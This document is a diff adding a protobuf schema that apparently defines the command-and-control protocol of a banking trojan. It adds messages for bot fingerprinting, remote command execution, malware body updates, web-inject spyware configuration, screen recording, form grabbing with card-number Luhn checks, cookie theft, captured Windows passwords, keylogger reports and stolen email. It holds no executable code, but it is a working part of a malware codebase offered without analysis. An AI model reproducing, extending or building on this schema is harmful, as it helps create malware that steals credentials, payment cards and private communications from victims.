@@ -1,0 +1,299 @@
+message CommandExecutionRequest {
+	optional string process = 1;
+	optional string command = 2;
+}
+message FileUpload {
+    optional string filename = 1;
+    optional bytes  content = 2;
+}
+
+message FileAttribues {
+    optional string name = 1;
+    optional string realname = 2;
+    optional bool isFile = 3;
+    optional bool isDirectory = 4;
+    optional bool isBlockDevice = 5;
+    optional bool isSymbolicLink = 6;
+    optional int64 size = 7;
+    optional int64 ctime = 8;
+    optional int64 atime = 9;
+}
+
+message DirectoryListing{
+    repeated FileAttribues files = 1;
+}
+message AdapterAddress {
+    optional string address = 1;
+    optional string netmask = 2;
+    optional string family = 3;
+    optional string mac = 4;
+    optional int32 scopeid = 5;
+    optional bool internal = 6;
+}
+
+message NetworkInterface {
+    optional string connectionName = 1;
+    repeated AdapterAddress adresses = 2;
+}
+
+message NetworkInterfaces {
+    repeated NetworkInterface Interfaces = 1;
+}
+
+message Processor {
+    optional string model = 1;
+    optional int32 speed = 2;
+}
+
+message Bot {
+    optional string processName = 1;
+    optional string guid = 2;
+    optional string vendor = 3;
+    optional string os = 4;
+    optional string ie = 5;
+    optional string ver = 6;
+    optional int32  uptime = 7;
+    optional int32  upspeed = 8;
+    optional string internalAddress = 9;
+    optional string HomePath = 10;
+    optional string ComputerName = 11;
+    optional string SystemDrive = 12;
+    optional string SystemRoot = 13;
+    optional string UserDomain = 14;
+    optional string UserName = 15;
+    optional string UserProfile = 16;
+    optional string LogonServer = 17;
+    optional int64  freemem = 18;
+    optional int64  totalmem = 19;
+    optional NetworkInterfaces networkInterfaces = 20;
+    optional string tmpdir = 21;
+    repeated Processor cpus = 22;
+    optional string hostname = 23;
+    optional bool IsVirtualMachine = 24;
+
+	
+    optional bool ProxyEnable = 25;
+    optional string ProxyServer = 26;
+    optional string AutoConfigURL = 27;
+    optional string ProxyServerUsedForConnection = 28;
+
+	repeated string browserProfiles = 29;
+}
+
+message Tasks {
+
+    message Settings {
+        optional int32  pingTime = 1;
+    }
+    
+    optional Settings  settings = 1;
+    optional bytes     slch = 2;
+    optional bytes     rbody32_hash = 3;
+    optional bytes     rbody64_hash = 4;
+    optional bytes     defaultjs_hash = 5;
+}
+message BodyUpdate {
+  optional int32 platform = 1;
+  optional bytes newbody = 2;
+}
+message RedirectionEntry {
+    optional string name = 1;
+    optional string uri = 2;
+    optional string keyword = 3;
+    optional string uripassword = 4;
+    optional string datapassword = 5;
+}
+
+message ProcessModule {
+	optional string szExePath = 1;
+	optional uint32 GlblcntUsage = 2;
+	optional uint64 hModule = 3;
+	optional uint64 modBaseAddr = 4;
+	optional uint64 modBaseSize = 5;
+	optional uint32 ProccntUsage = 6;
+	optional uint32 pcPriClassBase = 7;
+	optional uint32 dwFlags = 8;
+	optional string szModule = 9;
+	optional uint32 th32ModuleID = 10;
+	optional uint32 th32ProcessID = 11;
+}
+
+message Process {
+	optional string szExeFile = 1;
+	optional uint32 cntUsage = 2;
+	optional uint32 th32ProcessID = 3;
+	optional uint32 th32ModuleID = 4;
+	optional uint32 cntThreads = 5;
+	optional uint32 th32ParentProcessID = 6;
+	optional uint32 pcPriClassBase = 7;
+	optional uint32 dwFlags = 8;
+	optional bool	owned = 9;
+	repeated ProcessModule modules = 10;
+}
+
+message ProcessList {
+ 	repeated Process Processes = 1;
+}
+
+message BaseEntryBlock  {
+	repeated string url = 1;
+	optional bool enabled = 2           [default = true];
+	repeated string guids = 3;
+	optional bool filt_get = 4          [default = true];
+	optional bool filt_post = 5         [default = true]; 
+}
+
+message SpywareConfigEntry {
+    required BaseEntryBlock base = 1;
+    optional string data_before = 2;
+    optional string data_inject = 3;
+    optional string data_after = 4;
+    repeated string stoplist = 5;
+	repeated string domains = 6;
+}
+
+message VideoConfigEntry {
+	required BaseEntryBlock base = 1;
+
+	optional bool grayScale = 2         [default = true];
+	optional int32 framerate = 3        [default = 5];
+	optional int32 seconds = 4          [default = 30];
+	optional string filenameMask = 5;
+	optional bool uploadAfterRecord = 6 [default = true];
+	optional string hashkey = 7;
+	repeated string stoplist = 8;
+}
+
+message FragmentConfigEntry {
+    required BaseEntryBlock base = 1;
+
+    optional string from = 2;
+    optional string to = 3;
+	optional string varname = 4 [default = ''];
+}
+
+
+message MailFilterEntry {
+	optional string from = 1;
+	optional string to = 2;
+	optional string subject = 3;
+	optional string body = 4;
+}
+
+message PostParamsRecorderEntry {
+	required BaseEntryBlock base = 1;
+	optional string paramname = 2;
+	optional string macrosname = 3;
+}
+
+message BotSettings {
+    optional int32	fgMaxDataSize = 1   [default = 65000];
+    optional int32	fgMinDataSize = 2   [default = 0];
+    optional bool	fgCaptureGet = 	3   [default = false];
+    optional bool	fgCapturePost = 4   [default = true];
+    optional bool	fgCaptureCookies = 5[default = false];
+    repeated string fgBlackList = 6;
+    repeated string fgWhiteList = 7;	
+    optional int32	netCcTimeout = 8    [default = 300000];
+
+	optional bool	kgIsKeyloggerEnabled = 9[default = false];
+}
+
+message SpywareConfig {
+    repeated SpywareConfigEntry injects = 1;
+    repeated VideoConfigEntry recorders = 2;
+    repeated FragmentConfigEntry fragments = 3;
+    repeated MailFilterEntry emailfilter = 4;
+    repeated RedirectionEntry redirects = 5;
+    repeated PostParamsRecorderEntry post2macros = 6;
+    optional BotSettings settings = 7;
+}
+
+message Form {
+	optional string method = 1;
+	optional string source = 2;
+	optional string location = 3;
+	optional string referer = 4;
+	optional bool	isSsl = 5;
+	optional string rawHeaders = 6;
+	optional bytes	postData = 7;
+	optional string protocol = 8;
+	optional bool 	isCertificateUsed = 9;
+	optional bool 	isLuhnTestPassed = 10;
+	optional string remoteAddress = 11;
+}
+
+message GrabbedPageFragment {
+    optional string url = 1;
+    optional string from = 2;
+    optional string to = 3;
+    optional string fragmentText = 4;
+    optional string source = 5;
+}
+
+message LocalVar {
+	optional string name = 1;
+	optional string value = 2;
+}
+
+message LocalVarsList {
+	repeated LocalVar	vars = 1;
+	optional int32		timestamp = 2;
+}
+message CookieMessage {
+	optional string name = 1;
+	optional string value = 2;
+	optional string path = 3;
+	optional string domain = 4;
+	optional bool hostOnly = 5;
+	optional bool httpOnly = 6;
+	optional bool secure = 7;
+	optional bool session = 8;
+	optional int32 expirationDate = 9;
+	optional string source = 10;
+	optional string profile_path = 11;
+}
+message LsaAuth {
+     optional string UserName = 1;
+     optional string UserDomain = 2;
+     optional string UserPassword = 3;
+	 optional string ProfilePath = 4;
+}
+message MailMessage {
+     optional string html = 1;
+     optional string text = 2;
+     optional string subject = 3;
+     optional string messageId = 4;
+     optional string inReplyTo = 5;
+     optional string priority = 6;
+     optional string from = 7;
+     optional string to = 8;
+     optional string date = 9;
+     optional string receivedDate = 10;
+     optional string headers = 11;
+     optional bool isDeletedByMailware = 12;
+}
+message LogLine {
+     optional string logstr = 1;
+}
+
+
+message KeyloggerReport {
+	optional string keystroke = 1;
+	optional string windowName = 2;
+	optional string processPath = 3;
+}
+
+message WindowChangeEventMessage {
+	optional int32	localTimeDate = 1;
+	optional string	windowName = 2;
+	optional string	processPath = 3;
+}
+
+message SecureDeviceEventLog {
+	optional int32	localTimeDate = 1;
+	optional string	deviceName = 2;
+	optional string	eventName = 3;
+	optional string	lastWindowName = 4;
+	optional string	lastProcessPath = 5;
+}
